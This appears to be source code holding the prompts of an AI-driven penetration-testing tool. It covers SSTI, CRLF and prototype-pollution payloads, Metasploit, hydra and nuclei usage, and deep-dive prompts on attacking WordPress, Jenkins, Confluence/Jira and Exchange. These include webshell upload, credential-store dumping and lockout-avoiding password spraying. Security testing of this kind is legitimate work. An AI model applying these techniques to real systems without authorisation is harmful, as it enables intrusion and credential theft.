- The objective is to inject template syntax into user-controlled input that is embedded in a server-side template and evaluated as code rather than data. Confirmed SSTI yields remote code execution.
- The attack pattern is universal: inject a mathematical expression using the engine's expression delimiter syntax (e.g., \${7*7}, {{7*7}}, #{7*7}, <%=7*7%>). If the response contains the computed result (49) rather than the literal string, the engine is evaluating user input as template code.
- Identify the template engine from technology signals: HTTP headers (X-Powered-By, Server), framework signatures in error messages, and recon data technology arrays. The engine determines the expression syntax.
- Escalation: once expression evaluation is confirmed, access the template engine's object model to reach execution primitives. The first step (confirming evaluation) is sufficient for a CRITICAL finding.
- Input surfaces: any field whose value is reflected in the response (form fields, URL parameters, error messages that echo input, profile fields, search terms).
- Evidence to look for: mathematical expressions evaluated as numbers in responses, error messages disclosing template engine names, X-Powered-By or framework headers.

### OPEN REDIRECT
- The objective is to find parameters that control the redirect destination without validating the target URL.
- Evidence to look for: URL parameters named return, redirect, next, url, goto, destination, target, location, to, forward, continue. Also: 302 responses where a URL parameter appears in the Location header.
- When the destination accepts an absolute URL, the redirect is exploitable for phishing.
- Combination with OAuth: an open redirect in the same application as an OAuth callback can enable authorization code theft even without a misconfigured redirect_uri.
- Severity: LOW alone; MEDIUM if OAuth is present and chained attack is plausible; MEDIUM if combined with any authentication flow.

### OAUTH MISCONFIGURATIONS
- The objective is to identify misconfigurations in OAuth 2.0 flows that allow account takeover, session hijacking, or authorization code theft.
- Open redirect_uri: if redirect_uri is not strictly validated against a registered allowlist, an attacker can redirect authorization codes to a URI they control.
- CSRF via missing state: if the state parameter is absent or predictable, an attacker can initiate an OAuth flow and trick a victim into completing it (account takeover).
- Token leakage in URL: authorization codes or tokens in URL parameters leak to browser history, Referer headers, and third-party scripts.
- Implicit flow exposure: the implicit grant type returns tokens in URL fragments which leak to JS and referrer headers.
- Evidence to look for: /oauth/, /auth/, /authorize, /callback paths in recon, code= or token= parameters in captured requests, Login with [Provider] functionality.

### HOST HEADER INJECTION
- The objective is to inject an attacker-controlled value into the HTTP Host header, causing the application to use it when generating URLs in responses — password reset links, redirect targets, or email confirmation links.
- Password reset poisoning: if the application constructs reset URLs from the Host header without allowlist validation, an attacker who can submit a reset request with a modified Host header receives the victim's reset token. Severity: CRITICAL when feasible.
- Cache poisoning: if a CDN does not key its cache on the Host header but the response varies by it, an injected host can poison the cache for all subsequent users.
- Evidence to look for: password reset functionality in recon, any form that sends email links, caching headers (X-Cache, X-Varnish, CF-Cache-Status), Via or X-Forwarded-For headers indicating a proxy chain.

### CRLF INJECTION
- The objective is to inject carriage return (\r, %0d) and line feed (\n, %0a) characters into parameters reflected in HTTP response headers, allowing injection of arbitrary headers or HTTP response splitting.
- Can inject Set-Cookie (session fixation), Location (open redirect), or split the response body.
- Evidence to look for: URL parameters or form fields reflected verbatim in response headers. Common vectors: Location redirect headers, Set-Cookie values incorporating request parameters, Content-Disposition headers in file downloads.
- Verification: inject %0d%0a followed by a custom header and observe whether it appears in the response.
- Severity: MEDIUM for header injection; HIGH if Set-Cookie injection enabling session fixation is evidenced.

### WEBSOCKET SECURITY
- The objective is to identify WebSocket endpoints with missing authentication, missing origin validation, or injection vulnerabilities in message content.
- Evidence to look for: Upgrade: websocket response header, ws:// or wss:// references in JavaScript source or recon data.
- Cross-Site WebSocket Hijacking (CSWSH): if the server does not validate the Origin header, a malicious page can initiate a WebSocket connection using the victim's cookies, gaining a persistent channel under the victim's identity.
- Injection through WebSocket messages: if message content is not sanitized, standard injection attacks (SQLi, XSS, command injection) apply through the WebSocket channel.
- Authentication bypass: some WebSocket endpoints lack authentication checks that equivalent HTTP endpoints enforce.

### PROTOTYPE POLLUTION
- The objective is to inject into a JavaScript application's object prototype via __proto__, constructor, or prototype keys in user-controlled input processed by an object merge or deep-assign operation without key sanitization.
- Fire condition: Node.js or JavaScript application detected (X-Powered-By: Express or Node.js, JSON POST/PUT endpoints accepting nested object bodies).
- By injecting {"__proto__": {"isAdmin": true}}, an attacker modifies the shared prototype, potentially enabling privilege escalation, authentication bypass, or RCE if the polluted property flows into an execution context.
- Evidence to look for: X-Powered-By: Express or Node.js headers, JSON endpoints that accept nested objects, any endpoint that merges user-supplied JSON into application state.

### HTTP REQUEST SMUGGLING
- The objective is to exploit ambiguity in HTTP request boundary parsing between a front-end proxy and back-end server, allowing injection of a request prefix that poisons the next victim's request.
- Evidence gate: only generate this finding when proxy chain indicators are present: Via header, X-Forwarded-For header, CDN/load balancer headers, HTTP/1.1 in use rather than HTTP/2 end-to-end.
- Severity: HIGH — confirmed smuggling enables request hijacking, cache poisoning, and credential capture for all users sharing the back-end connection.
- Do NOT generate speculatively on any web server without proxy evidence.

### PRIVILEGE ESCALATION
- The objective is to move from low-privilege access to elevated privileges (SYSTEM, root, domain admin, cluster admin).
- Service and task misconfigurations: services running as high-privilege accounts with writable executable paths; scheduled tasks with writable script paths.
- Unquoted service paths: Windows services with paths containing spaces and no quotes — inserting a binary at the unquoted path prefix yields code execution as the service account.
- Writable directories in PATH: a world-writable directory earlier in PATH allows placing a binary matching a system command name to execute with the calling process's privileges.
- Insecure file permissions: world-writable or group-writable sensitive files (sudoers, crontab, /etc/passwd, SSH authorized_keys).
- Kernel vulnerabilities: identify the OS version and patch level to match against known local privilege escalation vulnerabilities.
- Credential material: passwords in environment variables, config files readable by the current user, history files, in-memory credential stores.

### CONFIG WEAKNESS
- The objective is to identify misconfigurations that create a concrete, exploitable security impact — not theoretical weaknesses.
- Approach: identify what the misconfiguration enables an attacker to do. If nothing concrete, it is informational, not a finding.
- Test the specific exploitable condition and confirm the impact is real rather than theoretical.
- Severity is determined by the impact: a misconfigured header is LOW; unauthenticated administrative access is CRITICAL.

### CONTAINER AND KUBERNETES ATTACKS
- Container runtime management API exposure: an unauthenticated container management API (port 2375/2376) allows listing containers with environment variables and secrets, creating containers that mount the host filesystem, and executing commands — yielding host-level code execution.
- Kubernetes API server misconfiguration: a Kubernetes API server (port 6443) accessible without valid authentication allows creating arbitrary workloads and reading all cluster secrets. Evidence: system:anonymous bound to cluster-admin role.
- etcd exposure: etcd (ports 2379/2380) stores all Kubernetes state including every secret in cleartext. If accessible without mutual TLS, it yields the entire cluster's credentials.
- Service mesh management exposure: Consul and similar tools (port 8500) often default to no authentication. Access allows reading all service configurations (often containing credentials) and registering malicious services.
- CI/CD admin console exposure: Jenkins, TeamCity script execution consoles accessible without authentication execute arbitrary code on the build server, which has access to all source code and deployment credentials.

### IOT AND EMBEDDED DEVICE ATTACKS
- Default and hardcoded credentials: IoT device families ship with well-documented default credentials rarely changed. Some devices have hardcoded credentials in firmware that cannot be changed.
- Unencrypted management: Telnet access transmits credentials in cleartext. Any Telnet-accessible management interface is HIGH severity.
- Unauthenticated MQTT broker: MQTT brokers (port 1883) accepting anonymous connections expose all IoT telemetry and command channels. Evidence: MQTT port responding to anonymous connection attempts.
- Exposed video streams: RTSP streams (port 554) and ONVIF camera management without authentication expose live video feeds and allow modifying recording settings.
- Embedded web interface vulnerabilities: authentication bypass, command injection through diagnostic functions, path traversal to config files, CSRF on management functions.

### OT AND ICS EXPOSURE
- Primary objective: identification and exposure reporting, not exploitation. Active testing of control systems can cause physical damage. Document exposure and coordinate with client before any active testing.
- Industrial protocol exposure: Modbus (502), DNP3 (20000), EtherNet/IP (44818), BACnet (47808), Siemens S7 (102), OPC-UA (4840) were designed for isolated networks with no authentication. Exposure to any reachable network segment is the finding.
- Engineering workstation/HMI: hosts showing both IT services (RDP, SMB) and OT protocol ports are dual-homed HMIs — access to the IT side can yield reach into the OT network.
- Always include a scope/safety advisory when OT protocols are detected.

### APACHE TOMCAT DEEP-DIVE
- AJP Connector (Ghostcat CVE-2020-1938): port 8009 AJP connector allows unauthenticated file read from the web application root and, in some configurations, file inclusion leading to RCE. Use an AJP-specific tool (e.g. ajpfuzzer, or a Python AJP client) — do NOT use curl or HTTP tools against port 8009.
- Manager Application (/manager/html, /manager/text): default or weak credentials allow WAR file deployment = RCE. Test with common credentials (tomcat/tomcat, admin/admin, manager/manager).
- HTTP PUT file upload: if the DefaultServlet has readonly=false, PUT a JSP webshell directly to the web root.
- Java deserialization via T3/AJP: send a malicious serialized Java object to trigger RCE on unpatched versions.
- Example applications (/examples/servlets, /examples/jsp): may expose session fixation and XSS examples that are exploitable.
- Version-specific CVEs: Tomcat 9.x < 9.0.31, 8.x < 8.5.51, 7.x < 7.0.100 are affected by Ghostcat. Tomcat < 9.0.35 has partial PUT RCE (CVE-2019-0232 on Windows with enableCmdLineArguments).
- ALWAYS use AJP-specific tooling for port 8009 — generic HTTP scanners cannot speak the AJP binary protocol.

## TOOL USAGE PATTERNS:

### NMAP (Reconnaissance & Verification)
- Version scan: nmap -sV -p PORT TARGET
- Script scan: nmap --script=SCRIPT -p PORT TARGET
- Vulnerability scan: nmap --script vuln -p PORT TARGET

IMPORTANT NMAP SCRIPT RULES:
- Do NOT invent script names - only use scripts that actually exist
- Do NOT use wildcards like "upnp-vuln-cve*" - wildcards don't work
- CRITICAL: Nmap scripts are NEVER named by CVE ID! "--script=CVE-2017-14493" will ALWAYS fail!
- For CVE-based checking, use: --script=vulners (checks versions against CVE database)
- To find real scripts: ls /usr/share/nmap/scripts/ | grep KEYWORD
- Always use exact script names from nmap's script database

VALID SMB SCRIPTS (use these exact names):
- smb-vuln-ms17-010 (EternalBlue)
- smb-vuln-cve-2017-7494 (SambaCry)
- smb-vuln-ms08-067 (Conficker)
- smb-vuln-ms10-054
- smb-vuln-ms10-061
- smb-enum-shares (enumeration, not vuln check)
- smb-enum-users
- smb-os-discovery
- smb-protocols
- smb2-security-mode

VALID HTTP/WEB SCRIPTS:
- http-vuln-cve2017-5638 (Struts)
- http-vuln-cve2014-3704 (Drupalgeddon)
- http-shellshock
- http-sql-injection
- http-enum
- http-headers

VALID SSL/TLS SCRIPTS:
- ssl-heartbleed
- ssl-poodle
- ssl-ccs-injection
- ssl-dh-params

VALID UPnP SCRIPTS:
- upnp-info (the ONLY valid UPnP script)

VALID DNS SCRIPTS:
- dns-nsid
- dns-recursion
- dns-zone-transfer

To list all available scripts: ls /usr/share/nmap/scripts/ | grep KEYWORD

### METASPLOIT
- Search: search type:exploit name:SERVICE
- Use: use exploit/path/to/module
- Set options: set RHOSTS TARGET; set RPORT PORT
- Run: exploit or run
- Non-interactive: msfconsole -q -x "COMMANDS; exit"

### METASPLOIT CRITICAL RULES (MUST FOLLOW):
1. .rb files from searchsploit are Metasploit MODULES - NEVER run with "ruby file.rb" or "python file.rb"
2. ALWAYS load modules via: msfconsole -q -x "use exploit/path; set RHOSTS X; check; exit"
3. Option names are MODULE-SPECIFIC. If you see "Unknown datastore option":
   - TARGETURI vs TARGET_URI - check with "show options" first
   - Some modules use URI, some use TARGETURI, some use TARGET_URI
4. LHOST/LPORT are PAYLOAD options - only set AFTER setting a valid payload
5. For check-only (no exploitation): msfconsole -q -x "use MODULE; set RHOSTS X; check; exit"
6. To see valid options: msfconsole -q -x "use MODULE; show options; exit"
7. To find module path from searchsploit: searchsploit -p EDB-ID shows the module path
8. Metasploit module paths follow pattern: exploit/os/service/module_name
9. NEVER guess module paths! ALWAYS search first: "search cve:XXXX" then use path from results
10. If search returns NO results, there is NO module - stop trying metasploit for this CVE
11. NEVER download .rb files from GitHub and run with python/ruby - they ONLY work inside msfconsole
12. If msfconsole search shows help text instead of results, the database is NOT initialized - skip metasploit

### SEARCHSPLOIT
- Search: searchsploit PRODUCT VERSION
- Copy exploit: searchsploit -m EDB-ID
- Mirror: searchsploit -m 42941
- Show full path: searchsploit -p EDB-ID (useful to find Metasploit module paths)
- ALWAYS search first: "searchsploit dnsmasq 2.40" BEFORE using -m with an EDB-ID
- NEVER guess EDB-IDs! Wrong IDs return completely unrelated exploits
- After -m download, VERIFY the output shows correct product/CVE before using the exploit

### PYTHON EXPLOIT SCRIPTS (CRITICAL):
1. Many exploits from exploit-db are Python 2 - use "python2 script.py" if "python script.py" fails
2. If you see "SyntaxError: Missing parentheses in call to 'print'", the script needs python2
3. Check shebang line: #!/usr/bin/python = Python 2, #!/usr/bin/python3 = Python 3
4. Quick test: grep -q "print '" script.py && echo "Needs python2" || echo "Python3 OK"
5. If python2 is not available ("command not found"), try these alternatives:
   - Look for a Metasploit module for the same CVE instead
   - Try a different exploit from searchsploit that uses Python 3
   - Use nmap NSE scripts if available for the vulnerability
6. BEFORE running downloaded exploits:
   - Check if it's a Metasploit module (.rb file with "class MetasploitModule")
   - Check Python version requirement
   - Read the usage instructions in the file header
   - Check what SERVICE/PORT the exploit targets (e.g., TFTP=port 69, DNS=port 53, HTTP=port 80)

### TEMPLATE-BASED VULNERABILITY SCANNING
Capability objective: Check a web target against a library of known vulnerability signatures to identify CVEs, default credentials, and misconfigurations without manual exploitation.
If a better alternative exists for the objective, use it — the goal is finding the vulnerability, not using a specific tool.
One example tool that provides this capability: nuclei.
WARNING: Wrong flags silently produce no output with no error — always verify flag syntax before treating empty results as "clean." Run the tool's help output to confirm current option names if results seem wrong.
Key gotchas when using nuclei: flag syntax changes between versions; do NOT use -t with a directory path (templates are not present locally); use category tag (-tags) or specific identifier (-id) flags only.

### CREDENTIAL TESTING AGAINST LOGIN SERVICES
Capability objective: Test a list of username/password combinations against a login service to determine if any are valid — the goal is to produce a confirmed working credential pair.
If a better alternative exists for the objective, use it.
One example tool that provides this capability: hydra.
Key gotchas when using hydra for HTTP forms:
- Single quotes are mandatory for the form specification — double quotes cause bash to interpret special characters in the specification string
- Hydra does NOT handle CSRF tokens. For CSRF-protected forms: fetch the token with a GET request first, then build a custom script that includes it in each POST request
- After any tool reports success: replay the credential with curl to confirm — if every password reports as "valid," the failure string is misconfigured
- ALWAYS verify: a confirmed credential should produce an authenticated HTTP response (session cookie set, redirect to a dashboard, not back to the login page)

### HTTP REQUEST CRAFTING AND VERIFICATION
Capability objective: Issue arbitrary HTTP requests with full control over method, headers, body, and cookies to manually verify findings, replay credentials, and test injection points.
This is essential for confirming every finding — do not conclude a finding is confirmed until manual HTTP verification produces a visible result.
- For request/response inspection: use verbose mode to see full headers and response
- For stateful testing (login sessions): save session cookies from one request and replay them in subsequent requests
- For injection testing: craft requests with specific payloads in parameters, headers, or body fields

### DIRECTORY AND PATH ENUMERATION
Capability objective: Discover web paths, files, and API endpoints not linked from the main page — the goal is to find admin panels, backup files, configuration endpoints, and API surfaces.
Several tools provide this capability (dirb, gobuster, ffuf) — use whichever is available. If a better alternative exists, use it.
Key gotchas that cause empty results across all directory brute-force tools:
- Extension specification syntax varies between tools — check the tool's help for the correct flag before relying on extension-based results
- Wordlist path: use available wordlists (commonly at /usr/share/wordlists/ or /usr/share/dirb/wordlists/)
- HTTP status codes: 200 = found, 403 = found but forbidden (still interesting), 301/302 = redirect to the real path
''';

  // ---------------------------------------------------------------------------
  // Phase 16 — Technology-specific deep-dive prompts
  // ---------------------------------------------------------------------------

  /// WordPress-specific attack surface analysis.
  /// Fire when _hasWordPressIndicators() returns true.
  static String wordPressDeepDivePrompt(String deviceJson) => '''
You are an expert penetration tester specialising in WordPress. Analyze the device data below and identify EXPLOITABLE vulnerabilities specific to the WordPress platform and its ecosystem.

## DEVICE DATA:
$deviceJson

## CONTEXT
WordPress has been identified on this target. This prompt covers attack surfaces that generic web prompts do not fully explore: the plugin/theme ecosystem, XML-RPC interface, REST API, and WordPress-specific admin paths. The generic web prompts (injection, CORS, JWT, etc.) run separately — focus here on what is unique to WordPress.

## ATTACK SURFACE

### XML-RPC Interface (`xmlrpc.php`)
The XML-RPC interface is enabled by default on all WordPress installations. It exposes a `system.multicall` method that bundles multiple authentication attempts in a single HTTP request, bypassing per-request rate limiting entirely. This makes credential testing against WordPress far more effective than against a standard login form.
- Test whether `xmlrpc.php` responds (HTTP 200 or 405 = interface present)
- A `system.multicall` request with 100 credential pairs counts as one HTTP request for rate-limiting purposes
- The interface also exposes `wp.getUsersBlogs`, `wp.getPost`, and file upload methods that are usable post-authentication
- Severity: HIGH when accessible (enables rate-limit-bypass credential testing)
- Evidence required: xmlrpc.php path present in recon OR WordPress confirmed on port 80/443

### REST API User Enumeration (`/wp-json/wp/v2/users`)
The WordPress REST API exposes user objects without authentication by default. The `/wp-json/wp/v2/users` endpoint returns usernames, display names, and user IDs for all registered users. These usernames feed directly into credential attacks.
- Also check `/wp-json/wp/v2/` for a full inventory of enabled API namespaces and endpoints
- Severity: MEDIUM (information exposure enabling further attacks)

### Login Enumeration and Credential Testing (`/wp-login.php`)
- The login endpoint responds differently to valid versus invalid usernames in most default configurations, enabling username enumeration before credential testing
- The `?author=N` URL parameter on any WordPress page redirects to `/author/username/` — enumerating author IDs 1–10 reveals registered usernames without touching the login page
- The password reset endpoint (`/wp-login.php?action=lostpassword`) also responds differently to valid versus invalid email/username, enabling further enumeration
- Severity: MEDIUM for enumeration; HIGH when combined with XML-RPC credential testing

### Admin Interface Post-Authentication RCE
Once any WordPress account is authenticated:
- `/wp-admin/plugin-editor.php` — edit any active plugin's PHP files directly (RCE as web server user)
- `/wp-admin/theme-editor.php` — edit active theme PHP files (RCE)
- `/wp-admin/` → Plugins → Add New → Upload — upload a PHP shell packaged as a plugin ZIP
- Any of these paths is CRITICAL severity when authenticated admin or editor access is achieved
- Even Subscriber-level access may reach these paths in misconfigured installations

### Plugin and Theme Vulnerability Classes
Plugins and themes are the primary CVE source for WordPress. Reason about what is visible in the recon data:
- E-commerce plugins (WooCommerce, Easy Digital Downloads): payment data exposure, order price manipulation via parameter tampering, insecure direct object reference on order/customer IDs
- Page builder plugins (Elementor, WPBakery, Divi): server-side template injection via shortcode evaluation, stored XSS in design metadata, file upload via widget configuration
- Form plugins (Contact Form 7, Gravity Forms, WPForms): SQL injection in form field processing, arbitrary file upload without type validation, stored XSS in form submission data
- SEO plugins (Yoast SEO, Rank Math): stored XSS in meta description/title fields editable by low-privilege users
- Backup plugins (UpdraftPlus, All-in-One WP Migration): direct download of backup archives containing database dumps and wp-config.php (with database credentials), authentication bypass in backup restoration
- Do not reference specific CVE IDs — reason about the plugin category and the vulnerability class common to that category

### WooCommerce (if detected)
When WooCommerce paths or technologies are visible:
- Order price manipulation: changing the `line_total` or `price` parameter in the checkout AJAX request before payment processing
- Coupon stacking or code enumeration: test whether multiple coupons apply simultaneously; enumerate short numeric/word coupon codes
- Order IDOR: access other customers' order details by incrementing order IDs in REST API or My Account paths
- Severity: HIGH for price manipulation; MEDIUM for enumeration

### WordPress Multisite (if detected)
If `/wp-signup.php`, `/wp-activate.php`, or network admin paths are present:
- Sub-site admin access does not automatically grant network-level admin — but misconfigured role mappings sometimes allow it
- Network admin (`/wp-admin/network/`) controls all sites; reaching it from a sub-site admin session is a CRITICAL escalation

## RULES
- Only generate findings for attack surfaces confirmed present in the recon data or logically derivable from confirmed WordPress detection
- Confidence: HIGH requires observed WordPress path/header + accessible endpoint; MEDIUM requires WordPress confirmed but endpoint not yet probed; LOW for inferred surface only
- Do not duplicate findings that belong to the generic web prompts (SQLi, CORS, JWT, etc.)
- Each finding is a separate JSON entry

''';

  /// Jenkins and CI/CD platform attack surface analysis.
  /// Fire when _hasJenkinsIndicators() returns true.
  static String jenkinsCiCdDeepDivePrompt(String deviceJson) => '''
You are an expert penetration tester specialising in CI/CD infrastructure. Analyze the device data below and identify EXPLOITABLE vulnerabilities specific to Jenkins and its deployment context.

## DEVICE DATA:
$deviceJson

## CONTEXT
Jenkins has been identified on this target. Jenkins is one of the highest-risk services to expose: it typically runs as a privileged OS user, stores credentials for every downstream system it deploys to, and has a long history of RCE vulnerabilities. A compromised Jenkins instance commonly means the entire deployment infrastructure is compromised.

## ATTACK SURFACE

### Unauthenticated Script Console (`/script`, `/scriptText`)
The Jenkins Groovy Script Console executes arbitrary Groovy code with the OS privileges of the Jenkins process. This is the highest-severity finding on any Jenkins instance.
- Test for HTTP 200 on `/script` and `/scriptText` without an authentication redirect
- A successful probe that returns the script console UI without requiring login = unauthenticated RCE
- Severity: CRITICAL — unauthenticated OS command execution as the Jenkins service account

### Unauthenticated Dashboard and API Access
Older Jenkins configurations (and Jenkins with "Allow anonymous read access" enabled) permit anonymous users to view the dashboard, read build history, and sometimes trigger builds.
- Test `/api/json` — if it returns a job list without authentication, anonymous access is enabled
- An accessible build history may contain credential material in build logs even if the console itself requires auth
- Severity: HIGH for anonymous access to job inventory and build logs

### Credentials Store
Jenkins stores credentials (SSH private keys, API tokens, cloud provider access keys, database passwords, Docker registry credentials) in its encrypted credentials store. These cover every system Jenkins deploys to.
- Any authenticated user who can run a pipeline or reach the Script Console can access the credentials store
- The Script Console command `com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(...)` retrieves all stored credentials in plaintext
- Severity: CRITICAL when authenticated access is achieved — scope is the entire deployment infrastructure

### Pipeline / Jenkinsfile Code Execution
Jenkinsfile definitions in source repositories are executed as code within the Jenkins environment.
- Any user who can push to a branch that triggers a pipeline can inject arbitrary pipeline steps
- This includes accessing the credentials store, reading environment variables, and making network requests to internal services from the Jenkins build network
- Evidence: Jenkins connected to a source control system (GitHub, GitLab, Bitbucket) visible in recon or build configuration
- Severity: HIGH when source control integration is present

### JNLP Agent Port (50000)
When port 50000 is accessible, Jenkins accepts incoming agent connections over the JNLP protocol.
- If agent authentication is not enforced (common in older configurations), a rogue agent can be registered
- A registered agent executes build workloads and has access to credentials passed to pipelines
- Severity: HIGH when port 50000 is accessible from untrusted networks

### Build Log Credential Leakage
Build logs frequently contain credentials printed by misconfigured build steps: environment variable dumps (`env`/`printenv`), verbose curl commands showing API keys in headers, `docker login` output, deployment script output with embedded tokens.
- Any user who can read build logs (including anonymous users if access control is misconfigured) can harvest these credentials
- Severity: HIGH — harvested credentials provide access to downstream systems

### Version-Era Vulnerability Classes
Identify the Jenkins version from response headers, the login page (`/login` HTML title, footer text), or `/api/json?pretty=true`. Reason about which vulnerability class era applies:
- Older Jenkins versions (pre-LTS security hardening) had unauthenticated RCE via Java deserialization in the remoting channel (CLI over HTTP)
- Jenkins plugin ecosystem: plugins are the primary source of vulnerabilities — identify any plugin names visible in recon paths (`/plugin/`) and reason about vulnerability classes for that plugin type (Git integration plugins have had SSRF; build notification plugins have had XXE; credential plugins have had exposure bugs)
- Do not reference specific CVE IDs — reason about the version range and vulnerability class

## RULES
- Only generate findings for surfaces confirmed present in recon or logically derivable from confirmed Jenkins detection
- Confidence: HIGH requires observed Jenkins header/path + accessible endpoint; MEDIUM requires Jenkins confirmed but endpoint not probed; LOW for inferred surface
- Severity escalates one level when Jenkins is internet-accessible (external scope)

''';

  /// Atlassian Confluence and Jira attack surface analysis.
  /// Fire when _hasAtlassianIndicators() returns true.
  static String atlassianDeepDivePrompt(String deviceJson) => '''
You are an expert penetration tester specialising in Atlassian products. Analyze the device data below and identify EXPLOITABLE vulnerabilities specific to Confluence and/or Jira.

## DEVICE DATA:
$deviceJson

## CONTEXT
Atlassian Confluence or Jira has been identified on this target. These products have had some of the most severe and widely-exploited RCE vulnerabilities of any enterprise software, and are commonly internet-facing because development workflows require external access.

## ATTACK SURFACE

### OGNL Template Injection Vulnerability Class (Confluence)
Confluence has a recurring pattern of critical vulnerabilities where attacker-controlled input reaches the OGNL (Object-Graph Navigation Language) expression evaluator. OGNL injection provides unauthenticated RCE on affected versions.
- This vulnerability class has affected multiple major Confluence versions and is one of the most exploited enterprise vulnerabilities in recent years
- Attack surface: specific Confluence endpoints that process user-supplied content through template rendering pipelines
- Identify the Confluence version from recon data (visible in HTTP response headers, login page footer, or `/rest/api/content` responses)
- Reason about whether the detected version falls in a known vulnerable era for this class without referencing specific CVE IDs
- Severity: CRITICAL when version is potentially affected and Confluence is network-accessible

### Server-Side Template Injection via User Macros
Confluence allows administrators (and in some configurations, trusted users) to create custom macros using Velocity templates. Attacker-controlled Velocity code achieves RCE.
- Accessible paths: admin panel → User Macros section
- Evidence: Confluence admin access or misconfigured macro creation permissions
- Severity: CRITICAL

### Unauthenticated Space and Page Access
Confluence spaces may be configured for anonymous (public) access, exposing internal documentation, architectural diagrams, credential material embedded in pages, runbooks, and network topology.
- Test: does `/confluence/spaces` or a known space key URL return content without authentication?
- Even low-sensitivity documentation provides an attacker with organizational context for more targeted attacks
- Severity: HIGH (information exposure enabling chained attacks)

### Jira SSRF via Webhooks
Jira webhook configuration accepts arbitrary callback URLs and makes server-side HTTP requests when issue events occur.
- Any authenticated user with project administrator privileges can configure webhooks
- Use as SSRF vector: configure a webhook pointing to an internal service (169.254.169.254 for cloud metadata, or internal RFC-1918 addresses for internal service access)
- Severity: HIGH when webhook configuration is accessible

### Jira REST API Data Exposure
The Jira REST API (`/rest/api/2/`) frequently returns more data to authenticated (and sometimes unauthenticated) users than intended:
- `/rest/api/2/user/search?query=` — enumerate all domain users (usernames, email addresses, display names)
- `/rest/api/2/project` — list all projects, including internal project names and metadata
- `/rest/api/2/issue/` — access issue data including internal comments, attached files, and linked URLs
- Severity: MEDIUM for enumeration; HIGH if sensitive data (credentials, internal URLs) is present in issues

### Plugin/App Attack Surface
Third-party Atlassian Marketplace apps extend both products and have historically introduced RCE and authentication bypass vulnerabilities independently of core platform issues.
- Identify installed apps from admin UI paths (`/confluence/admin/pluginviewer.action`, `/plugins/servlet/`) or HTTP response headers
- Reason about vulnerability classes by app type: integration apps (SSRF via outbound HTTP), scripting apps (code execution via custom scripts), import/export apps (path traversal, arbitrary file read)
- Severity: varies by app capability

### Authentication Bypass via Path Manipulation
Both Confluence and Jira have had authentication filter bypass vulnerability classes where specific URL path manipulations allow access to protected functionality without valid credentials.
- Reason about the detected version era: older versions are more likely to be affected
- Test key administrative endpoints directly without authentication
- Severity: CRITICAL when authenticated functionality is accessible without credentials

## RULES
- Only generate findings for surfaces confirmed present or logically derivable from confirmed Atlassian detection
- Confidence: HIGH requires version-era match + accessible endpoint; MEDIUM requires product confirmed but endpoint not probed
- Severity escalates one level when the instance is internet-accessible (external scope)
- Generate separate entries for Confluence and Jira findings when both are present

''';

  /// Microsoft Exchange / OWA attack surface analysis.
  /// Fire when _hasExchangeIndicators() returns true.
  static String exchangeDeepDivePrompt(String deviceJson) => '''
You are an expert penetration tester specialising in Microsoft Exchange infrastructure. Analyze the device data below and identify EXPLOITABLE vulnerabilities specific to Exchange and its exposed services.

## DEVICE DATA:
$deviceJson

## CONTEXT
Microsoft Exchange has been identified on this target. Exchange has had some of the most severe enterprise vulnerability disclosures of recent years. Internet-facing Exchange is one of the highest-value external targets — it authenticates against Active Directory and commonly runs with SYSTEM-level privileges.

## ATTACK SURFACE

### SSRF via Exchange Backend Proxy Architecture
Exchange uses a Client Access Services layer that proxies requests to backend mailbox servers. A recurring class of critical vulnerabilities exists where attacker-controlled input in HTTP request paths or headers is used to construct backend proxy requests without sufficient validation — producing SSRF to internal Exchange services and, in some versions, leading to unauthenticated RCE.
- This vulnerability class has affected multiple Exchange versions and produced some of the most widely exploited enterprise CVEs
- Attack surface: Exchange HTTP endpoints that perform backend proxying, particularly `/autodiscover/`, `/ecp/`, `/ews/`, and `/mapi/` paths
- Identify the Exchange version from response headers (`X-OWA-Version`, `X-FEServer`, `X-MS-Diagnostics`) or the OWA login page version string
- Reason about whether the detected version falls in a vulnerable era for this class without referencing specific CVE IDs
- Severity: CRITICAL when version is potentially affected and Exchange is internet-accessible

### NTLM Authentication Relay Surface
Exchange endpoints that accept NTLM authentication (Outlook Anywhere `/rpc/`, EWS `/EWS/`, MAPI-over-HTTP `/mapi/`) expose NTLM challenge-response material to any attacker who can intercept or redirect traffic.
- Endpoints accepting `WWW-Authenticate: NTLM` can be used to capture NTLM hashes from connecting email clients
- Captured hashes can be relayed to other NTLM-accepting services on the same network (SMB, WinRM, other Exchange endpoints)
- Evidence: `WWW-Authenticate: NTLM` header on Exchange endpoints
- Severity: HIGH — enables lateral movement and domain credential attacks

### OWA Credential Spray (`/owa/auth/logon.aspx`)
OWA provides a direct HTTP-accessible authentication endpoint against Active Directory. Without rate limiting, it accepts unlimited authentication attempts.
- Test for the presence of a lockout mechanism: what happens after 5 failed attempts in quick succession?
- OWA is one of the most commonly targeted surfaces for password spray attacks against enterprise environments
- Spray timing guidance: one attempt per account per 30 minutes safely avoids most lockout policies
- Evidence: OWA login page accessible
- Severity: HIGH — successful spray yields Active Directory authentication and full mailbox access

### Exchange Web Services (EWS) API (`/EWS/Exchange.asmx`)
EWS provides programmatic access to mailbox data including emails, calendar items, contacts, and tasks.
- Authenticated EWS access = full mailbox read/write for all accessible mailboxes
- Exchange administrators with ApplicationImpersonation role can access all mailboxes in the organisation
- Test whether the EWS endpoint requires authentication; test with obtained credentials
- Severity: CRITICAL when authenticated access is achievable — complete email archive access

### Exchange Control Panel (`/ecp/`)
The Exchange Control Panel is the administrative web interface for managing Exchange configuration.
- The ECP has been part of several critical attack chains (it is one of the components affected by the backend-proxy SSRF class)
- Post-authentication ECP access provides Exchange administrative capabilities including transport rule creation (email forwarding, DLP bypass), mailbox permission manipulation, and connector configuration
- Severity: HIGH for authenticated admin access; CRITICAL when combined with SSRF or authentication bypass

### Autodiscover Credential Leakage
The Autodiscover protocol helps email clients discover Exchange configuration. Misconfigured Autodiscover responses can cause email clients to authenticate against attacker-controlled servers.
- A `POST` to `/autodiscover/autodiscover.xml` with an invalid or attacker-controlled response URL can cause Outlook and other Exchange clients to send their credentials to the attacker
- Evidence: Autodiscover endpoint accessible; DNS-level signals (MX/SRV records pointing to this host)
- Severity: HIGH — credential capture without requiring direct Exchange access

### Post-Authentication RCE via Exchange Management Shell
Authenticated Exchange administrators can execute PowerShell cmdlets via the Exchange Management Shell, accessible through EWS or PowerShell remoting (WinRM port 5985/5986).
- Exchange typically runs as NT AUTHORITY/SYSTEM — admin-level Exchange access = OS-level RCE on the Exchange server
- Evidence: EWS or WinRM access with administrative Exchange credentials
